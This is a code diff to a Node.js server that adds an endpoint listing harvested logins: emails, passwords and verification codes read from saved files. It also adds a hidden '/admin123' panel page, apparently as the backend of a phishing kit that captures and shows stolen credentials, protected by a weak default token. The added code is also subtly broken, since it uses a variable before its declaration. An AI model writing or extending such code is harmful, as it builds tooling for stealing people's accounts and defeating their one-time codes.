@@ -77,6 +77,44 @@ const server = http.createServer((req, res) => {
         return;
     }
 
+    if (req.method === 'GET' && pathname === '/api/get-logins') {
+        const token = parsed.query.token || '';
+        const secret = process.env.PANEL_TOKEN || '2026';
+        if (token !== secret) {
+            res.writeHead(401, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({ error: 'Unauthorized' }));
+            return;
+        }
+        const files = fs.existsSync(SAVE_DIR) ? fs.readdirSync(SAVE_DIR) : [];
+        const data = files.map(f => {
+            const content = fs.readFileSync(path.join(SAVE_DIR, f), 'utf-8');
+            const lines = content.split('\n');
+            const email = (lines.find(l => l.startsWith('Email/Username:')) || '').replace('Email/Username: ', '');
+            const password = (lines.find(l => l.startsWith('Password:')) || '').replace('Password: ', '');
+            const code = (lines.find(l => l.startsWith('Kode Verifikasi:')) || '').replace('Kode Verifikasi: ', '') || null;
+            const created_at = (lines.find(l => l.startsWith('Tersimpan:')) || '').replace('Tersimpan: ', '');
+            return { id: files.indexOf(f) + 1, email, password, code, created_at };
+        }).reverse();
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({ data }));
+        return;
+    }
+
+    if (pathname === '/admin123') {
+        filePath = path.join(__dirname, 'panel.html');
+        const ext = '.html';
+        res.writeHead(200, { 'Content-Type': MIME[ext] || 'text/html; charset=utf-8' });
+        fs.readFile(filePath, (err, data) => {
+            if (err) {
+                res.writeHead(404, { 'Content-Type': 'text/plain' });
+                res.end('404 Not Found');
+                return;
+            }
+            res.end(data);
+        });
+        return;
+    }
+
     let filePath;
     if (pathname === '/') {
         const ua = (req.headers['user-agent'] || '').toLowerCase();
